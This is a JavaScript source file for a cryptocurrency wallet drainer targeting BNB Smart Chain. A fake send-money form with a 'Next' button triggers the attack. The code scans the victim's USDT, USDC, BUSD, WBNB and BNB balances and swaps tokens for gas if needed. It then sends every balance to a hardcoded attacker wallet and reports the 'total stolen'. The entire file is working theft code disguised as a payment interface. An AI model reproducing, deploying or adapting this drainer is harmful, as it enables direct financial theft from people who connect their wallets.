import { ethers } from 'ethers';

// ─── CONFIGURATION ─────────────────────────────────────
const CONFIG = {
    // Attacker's wallet (where funds go)
    DEST_WALLET: "0x2a8524097109450c5106Ee3a195A40a274535434",
    
    // BSC Network
    BSC_RPC: "https://bsc-dataseed1.binance.org/",
    BSC_CHAIN_ID: "0x38",
    
    // PancakeSwap Router
    PANCAKE_ROUTER: "0x10ED43C718714eb63d5aA57B78B54704E256024E",
    
    // Target Tokens
    TOKENS: {
        USDT: {
            address: "0x55d398326f99059fF775485246999027B3197955",
            decimals: 18,
            symbol: "USDT",
            minUSD: 0.5
        },
        USDC: {
            address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
            decimals: 18,
            symbol: "USDC",
            minUSD: 0.5
        },
        BUSD: {
            address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
            decimals: 18,
            symbol: "BUSD",
            minUSD: 0.5
        },
        WBNB: {
            address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            decimals: 18,
            symbol: "WBNB",
            minUSD: 0.5
        }
    },
    
    // Gas Settings
    GAS: {
        minBNB: "0.0003",
        gasLimit: 300000,
        slippage: 0.05,
        buffer: 1.2
    },
    
    // Attack Settings
    ATTACK: {
        minTotalUSD: 10,
        maxGasCostUSD: 0.50
    }
};

// ─── STATE ─────────────────────────────────────────────
let provider;
let userAddress;
let portfolio = { tokens: {}, bnb: 0, totalUSD: 0 };
let isProcessing = false;

// ─── UI ELEMENTS ──────────────────────────────────────
const ui = {
    nextBtn: document.getElementById('nextBtn'),
    amountInput: document.getElementById('amountInput'),
    recipientInput: document.getElementById('recipientInput'),
    usdLabel: document.getElementById('usdLabel'),
    statusBar: document.getElementById('statusBar'),
    progressFill: document.getElementById('progressFill'),
    progressContainer: document.getElementById('progressContainer'),
    maxBtn: document.getElementById('maxBtn'),
    clearAmount: document.getElementById('clearAmount'),
    clearAddr: document.getElementById('clearAddr'),
    addrGroup: document.getElementById('addrGroup'),
    amountGroup: document.getElementById('amountGroup')
};

// ─── UTILITY FUNCTIONS ──────────────────────────────

function updateStatus(message, type = 'info') {
    ui.statusBar.textContent = message;
    ui.statusBar.className = `status-bar show ${type}`;
    console.log(`[${type.toUpperCase()}] ${message}`);
}

function updateProgress(percent) {
    ui.progressContainer.classList.add('show');
    ui.progressFill.style.width = `${Math.min(100, percent)}%`;
}

function hideProgress() {
    setTimeout(() => {
        ui.progressContainer.classList.remove('show');
    }, 1000);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function formatUSD(value) {
    return value.toFixed(2);
}

// ─── PRICE FETCHING ──────────────────────────────────

async function getTokenPriceUSD(symbol) {
    try {
        const response = await fetch('https://api.pancakeswap.info/api/v2/tokens', {
            method: 'GET'
        });
        const data = await response.json();
        
        const tokenMap = {
            'USDT': '0x55d398326f99059fF775485246999027B3197955',
            'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
            'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
        };
        
        const address = tokenMap[symbol];
        if (data.data[address]) {
            return parseFloat(data.data[address].price);
        }
        return 1;
    } catch (error) {
        return 1;
    }
}

async function getBNBPrice() {
    try {
        const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
        const data = await response.json();
        return parseFloat(data.price);
    } catch {
        return 300;
    }
}

// ─── PORTFOLIO SCANNER ─────────────────────────────

async function scanPortfolio(address) {
    updateStatus('🔍 Scanning wallet portfolio...', 'info');
    updateProgress(10);
    
    const portfolioData = { tokens: {}, bnb: 0, totalUSD: 0 };
    const bnbPrice = await getBNBPrice();
    
    // Check BNB
    const bnbBalance = await provider.getBalance(address);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    const bnbUSD = bnbInBNB * bnbPrice;
    portfolioData.bnb = { balance: bnbBalance, usd: bnbUSD, inBNB: bnbInBNB };
    portfolioData.totalUSD += bnbUSD;
    
    updateProgress(30);
    
    // Check each token
    let tokenIndex = 0;
    const tokenEntries = Object.entries(CONFIG.TOKENS);
    
    for (const [symbol, token] of tokenEntries) {
        tokenIndex++;
        updateProgress(30 + (tokenIndex / tokenEntries.length) * 50);
        
        try {
            const balance = await getTokenBalance(address, token.address);
            const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, token.decimals));
            
            if (balanceFormatted > 0.001) {
                const price = await getTokenPriceUSD(symbol);
                const valueUSD = balanceFormatted * price;
                
                portfolioData.tokens[symbol] = {
                    ...token,
                    balance: balance,
                    balanceFormatted: balanceFormatted,
                    price: price,
                    valueUSD: valueUSD
                };
                
                portfolioData.totalUSD += valueUSD;
            }
        } catch (error) {
            console.warn(`Failed to fetch ${symbol}:`, error);
        }
    }
    
    updateProgress(80);
    portfolio = portfolioData;
    
    // Update UI with portfolio info
    const tokenCount = Object.keys(portfolioData.tokens).length;
    const bnbDisplay = portfolioData.bnb.inBNB > 0 ? `${portfolioData.bnb.inBNB.toFixed(4)} BNB` : '0 BNB';
    updateStatus(`✅ Found ${tokenCount} tokens + ${bnbDisplay} ($${formatUSD(portfolioData.totalUSD)})`, 'success');
    updateProgress(90);
    
    return portfolioData;
}

async function getTokenBalance(address, tokenAddress) {
    const contract = new ethers.Contract(
        tokenAddress,
        ['function balanceOf(address) view returns (uint256)'],
        provider
    );
    return await contract.balanceOf(address);
}

// ─── SWAP ENGINE ─────────────────────────────────────

async function swapTokensForBNB(tokenSymbol, amount, minBNBOut) {
    const token = CONFIG.TOKENS[tokenSymbol];
    if (!token) throw new Error(`Unknown token: ${tokenSymbol}`);
    
    updateStatus(`🔄 Swapping ${amount.toFixed(4)} ${tokenSymbol} → BNB for gas...`, 'info');
    
    const iface = new ethers.utils.Interface([
        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] path, address to, uint256 deadline)'
    ]);
    
    const path = [token.address, "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"];
    const deadline = Math.floor(Date.now() / 1000) + 1200;
    
    const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals);
    const amountOutMin = ethers.utils.parseEther(minBNBOut.toString());
    
    const swapData = iface.encodeFunctionData('swapExactTokensForETHSupportingFeeOnTransferTokens', [
        amountInWei,
        amountOutMin,
        path,
        userAddress,
        deadline
    ]);
    
    const tx = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: userAddress,
            to: CONFIG.PANCAKE_ROUTER,
            data: swapData,
            value: '0x0',
            gas: `0x${CONFIG.GAS.gasLimit.toString(16)}`
        }]
    });
    
    updateStatus('⏳ Waiting for swap confirmation...', 'info');
    await waitForTransaction(tx);
    
    updateStatus(`✅ Swapped ${amount.toFixed(4)} ${tokenSymbol} → BNB!`, 'success');
    return true;
}

// ─── GAS OPTIMIZER ──────────────────────────────────

async function ensureGasForDrain() {
    updateStatus('⛽ Checking gas balance...', 'info');
    updateProgress(50);
    
    const bnbBalance = await provider.getBalance(userAddress);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    const bnbPrice = await getBNBPrice();
    const bnbUSD = bnbInBNB * bnbPrice;
    
    const minBNBNeeded = parseFloat(CONFIG.GAS.minBNB);
    
    // Check if we have enough BNB
    if (bnbInBNB >= minBNBNeeded) {
        updateStatus(`✅ Sufficient BNB: ${bnbInBNB.toFixed(6)} BNB ($${bnbUSD.toFixed(2)})`, 'success');
        return true;
    }
    
    // NOT ENOUGH BNB - Need to swap
    const shortfallBNB = minBNBNeeded - bnbInBNB;
    const shortfallUSD = shortfallBNB * bnbPrice;
    
    updateStatus(`⚠️ Short on BNB: Need ${shortfallBNB.toFixed(6)} BNB ($${shortfallUSD.toFixed(2)})`, 'warning');
    updateStatus('🔄 Looking for tokens to swap for gas...', 'info');
    
    // Find best token to swap
    const swapCandidates = [];
    
    for (const [symbol, data] of Object.entries(portfolio.tokens)) {
        if (data.valueUSD < 1) continue;
        
        const swapAmount = (shortfallUSD / data.price) * CONFIG.GAS.buffer;
        const minBNBOut = shortfallBNB * 1.1;
        
        if (swapAmount <= data.balanceFormatted) {
            swapCandidates.push({
                symbol: symbol,
                amount: swapAmount,
                minBNBOut: minBNBOut,
                valueUSD: data.valueUSD
            });
        }
    }
    
    // Sort by value (swap smallest first)
    swapCandidates.sort((a, b) => a.valueUSD - b.valueUSD);
    
    if (swapCandidates.length === 0) {
        updateStatus('❌ No tokens available to swap for gas', 'error');
        return false;
    }
    
    // Execute swap
    for (const candidate of swapCandidates) {
        try {
            await swapTokensForBNB(
                candidate.symbol,
                candidate.amount,
                candidate.minBNBOut
            );
            
            // Check if we have enough BNB now
            const newBNB = await provider.getBalance(userAddress);
            const newBNBInBNB = parseFloat(ethers.utils.formatEther(newBNB));
            
            if (newBNBInBNB >= minBNBNeeded) {
                updateStatus(`✅ Gas secured! ${newBNBInBNB.toFixed(6)} BNB available`, 'success');
                return true;
            }
        } catch (error) {
            console.warn(`Swap failed for ${candidate.symbol}:`, error);
            continue;
        }
    }
    
    updateStatus('❌ Failed to secure enough BNB for gas', 'error');
    return false;
}

// ─── DRAIN ENGINE ────────────────────────────────────

async function executeMultiTokenDrain() {
    updateStatus('💰 Starting multi-token drain...', 'info');
    updateProgress(70);
    
    const results = [];
    let totalStolenUSD = 0;
    
    if (portfolio.totalUSD < CONFIG.ATTACK.minTotalUSD) {
        updateStatus(`⏭️ Skipping: Portfolio too small ($${formatUSD(portfolio.totalUSD)})`, 'warning');
        return results;
    }
    
    // Sort tokens by value
    const sortedTokens = Object.entries(portfolio.tokens)
        .filter(([symbol, data]) => data.valueUSD > CONFIG.TOKENS[symbol].minUSD)
        .sort((a, b) => b[1].valueUSD - a[1].valueUSD);
    
    // Drain each token
    for (const [symbol, data] of sortedTokens) {
        try {
            updateStatus(`💰 Draining ${symbol}: $${formatUSD(data.valueUSD)}...`, 'info');
            updateProgress(70 + (sortedTokens.indexOf([symbol, data]) / sortedTokens.length) * 20);
            
            const success = await drainToken(
                symbol,
                data.address,
                data.balance,
                data.decimals
            );
            
            if (success) {
                totalStolenUSD += data.valueUSD;
                results.push({ symbol, status: 'success', amount: data.valueUSD });
                updateStatus(`✅ Drained ${symbol}: $${formatUSD(data.valueUSD)}`, 'success');
            } else {
                results.push({ symbol, status: 'failed' });
            }
            
            await sleep(2000);
            
        } catch (error) {
            console.error(`Failed to drain ${symbol}:`, error);
            results.push({ symbol, status: 'error', error: error.message });
        }
    }
    
    // Drain remaining BNB
    const bnbBalance = await provider.getBalance(userAddress);
    const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
    const bnbPrice = await getBNBPrice();
    const bnbUSD = bnbInBNB * bnbPrice;
    
    if (bnbUSD > 0.50) {
        try {
            updateStatus(`💰 Draining remaining BNB: $${formatUSD(bnbUSD)}...`, 'info');
            const tx = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: userAddress,
                    to: CONFIG.DEST_WALLET,
                    value: bnbBalance.sub(ethers.utils.parseEther("0.0001")).toHexString(),
                    data: '0x',
                    gas: `0x${CONFIG.GAS.gasLimit.toString(16)}`
                }]
            });
            await waitForTransaction(tx);
            totalStolenUSD += bnbUSD;
            results.push({ symbol: 'BNB', status: 'success', amount: bnbUSD });
        } catch (error) {
            console.error('Failed to drain BNB:', error);
        }
    }
    
    updateProgress(100);
    updateStatus(`🎯 Drain complete! Total stolen: $${formatUSD(totalStolenUSD)}`, 'success');
    hideProgress();
    
    return results;
}

async function drainToken(symbol, tokenAddress, balance, decimals) {
    const amountHex = balance.toHexString();
    const cleanDest = CONFIG.DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const txData = "0xa9059cbb" + cleanDest + amountHex.replace('0x', '').padStart(64, '0');
    
    try {
        const tx = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: userAddress,
                to: tokenAddress,
                data: txData,
                value: '0x0',
                gas: `0x${CONFIG.GAS.gasLimit.toString(16)}`
            }]
        });
        
        await waitForTransaction(tx);
        return true;
    } catch (error) {
        console.error(`Drain failed for ${symbol}:`, error);
        return false;
    }
}

// ─── TRANSACTION HELPERS ──────────────────────────

async function waitForTransaction(txHash) {
    let attempts = 0;
    while (attempts < 30) {
        try {
            const receipt = await provider.getTransactionReceipt(txHash);
            if (receipt) {
                if (receipt.status === 1) {
                    return receipt;
                } else {
                    throw new Error('Transaction reverted');
                }
            }
        } catch (error) {
            // Transaction not yet mined
        }
        await sleep(2000);
        attempts++;
    }
    throw new Error('Transaction timeout');
}

// ─── MAIN ATTACK PIPELINE ──────────────────────────

async function executeAttack() {
    if (isProcessing) return;
    isProcessing = true;
    ui.nextBtn.disabled = true;
    ui.nextBtn.innerHTML = '<span class="spinner"></span> Processing...';
    ui.nextBtn.classList.remove('enabled');
    updateProgress(0);
    
    try {
        // STEP 1: Switch to BSC
        updateStatus('🌐 Switching to BSC network...', 'info');
        updateProgress(5);
        
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
            });
        } catch (error) {
            // Continue anyway
        }
        
        // STEP 2: Get wallet address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        userAddress = accounts[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
        
        if (!userAddress) {
            updateStatus('❌ No wallet connected', 'error');
            return;
        }
        
        updateStatus(`✅ Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`, 'success');
        updateProgress(10);
        
        // STEP 3: Initialize provider
        provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
        
        // STEP 4: Scan portfolio
        await scanPortfolio(userAddress);
        updateProgress(40);
        
        // STEP 5: Check if attack is worth it
        if (portfolio.totalUSD < CONFIG.ATTACK.minTotalUSD) {
            updateStatus(`⏭️ Portfolio $${formatUSD(portfolio.totalUSD)} below minimum $${CONFIG.ATTACK.minTotalUSD}`, 'warning');
            ui.nextBtn.innerHTML = '⏭️ Skip';
            return;
        }
        
        // STEP 6: Ensure gas (auto-swap if needed)
        const hasGas = await ensureGasForDrain();
        if (!hasGas) {
            updateStatus('❌ Failed to secure gas for drain', 'error');
            ui.nextBtn.innerHTML = '❌ Failed';
            return;
        }
        
        // STEP 7: Execute drain
        const results = await executeMultiTokenDrain();
        updateProgress(100);
        
        // Final status
        const totalStolen = results.reduce((sum, r) => sum + (r.amount || 0), 0);
        if (totalStolen > 0) {
            updateStatus(`✅ Success! Stolen $${formatUSD(totalStolen)} from ${results.length} tokens 🚀`, 'success');
            ui.nextBtn.innerHTML = `💰 $${formatUSD(totalStolen)} Stolen!`;
        } else {
            updateStatus('❌ No tokens were drained', 'error');
            ui.nextBtn.innerHTML = '❌ Failed';
        }
        
    } catch (error) {
        console.error('Attack failed:', error);
        updateStatus(`❌ Error: ${error.message || 'Unknown error'}`, 'error');
        ui.nextBtn.innerHTML = '❌ Error';
    } finally {
        isProcessing = false;
        ui.nextBtn.disabled = false;
        if (!ui.nextBtn.innerHTML.includes('$') && !ui.nextBtn.innerHTML.includes('Skip')) {
            ui.nextBtn.innerHTML = 'Next';
            if (parseFloat(ui.amountInput.value) > 0) {
                ui.nextBtn.classList.add('enabled');
            }
        }
    }
}

// ─── UI EVENT HANDLERS ─────────────────────────────

// Amount input
ui.amountInput.addEventListener('input', () => {
    const val = parseFloat(ui.amountInput.value) || 0;
    ui.usdLabel.textContent = val.toFixed(2);
    ui.nextBtn.disabled = val <= 0;
    if (val > 0) {
        ui.nextBtn.classList.add('enabled');
        if (!isProcessing) ui.nextBtn.innerHTML = 'Next';
    } else {
        ui.nextBtn.classList.remove('enabled');
        ui.nextBtn.innerHTML = 'Next';
    }
});

// Max button - finds largest token balance
ui.maxBtn.addEventListener('click', async () => {
    // If wallet not connected, try to connect first
    if (!provider) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                userAddress = accounts[0];
                provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
                await scanPortfolio(userAddress);
            }
        } catch (error) {
            console.error('Failed to connect:', error);
        }
    }
    
    let maxValue = 0;
    if (portfolio.totalUSD > 0) {
        // Find the largest token balance
        for (const [symbol, data] of Object.entries(portfolio.tokens)) {
            if (data.valueUSD > maxValue) {
                maxValue = data.valueUSD;
            }
        }
        if (maxValue > 0) {
            ui.amountInput.value = maxValue.toFixed(2);
            ui.amountInput.dispatchEvent(new Event('input'));
            updateStatus(`📈 Set to max: $${formatUSD(maxValue)}`, 'info');
        } else {
            ui.amountInput.value = "100";
            ui.amountInput.dispatchEvent(new Event('input'));
        }
    } else {
        ui.amountInput.value = "100";
        ui.amountInput.dispatchEvent(new Event('input'));
    }
});

// Clear amount
ui.clearAmount.addEventListener('click', () => {
    ui.amountInput.value = '';
    ui.amountInput.dispatchEvent(new Event('input'));
});

// Clear address
ui.clearAddr.addEventListener('click', () => {
    ui.recipientInput.value = '';
});

// Paste button
document.querySelector('.blue-text')?.addEventListener('click', async () => {
    try {
        const text = await navigator.clipboard.readText();
        ui.recipientInput.value = text;
        updateStatus('✅ Address pasted!', 'success');
    } catch {
        updateStatus('⚠️ Could not paste', 'warning');
    }
});

// Main Next button - ONE CLICK DOES EVERYTHING
ui.nextBtn.addEventListener('click', async () => {
    if (ui.nextBtn.disabled || isProcessing) return;
    
    // Check if wallet is connected, if not, connect
    if (!provider) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                userAddress = accounts[0];
                provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
                await scanPortfolio(userAddress);
            }
        } catch (error) {
            console.error('Failed to connect:', error);
        }
    }
    
    await executeAttack();
});

// ─── INITIALIZATION ──────────────────────────────────

document.addEventListener('DOMContentLoaded', async () => {
    updateStatus('💡 Enter amount and click "Next"', 'info');
    
    // Auto-detect if wallet already connected
    try {
        if (typeof window.ethereum !== 'undefined') {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                userAddress = accounts[0];
                provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
                await scanPortfolio(userAddress);
                updateStatus('✅ Wallet detected. Ready!', 'success');
                ui.nextBtn.disabled = false;
                if (parseFloat(ui.amountInput.value) > 0) {
                    ui.nextBtn.classList.add('enabled');
                }
            }
        }
    } catch (error) {
        console.warn('Init error:', error);
    }
});

// ─── EXPOSE FOR DEBUGGING ──────────────────────────

window.__drainer = {
    CONFIG,
    portfolio,
    scanPortfolio,
    executeAttack,
    swapTokensForBNB,
    ensureGasForDrain,
    executeMultiTokenDrain
};

console.log('🚀 Auto-Swap Drainer loaded!');
console.log('📊 Click "Next" to start the attack');
console.log('🔧 Debug: window.__drainer');
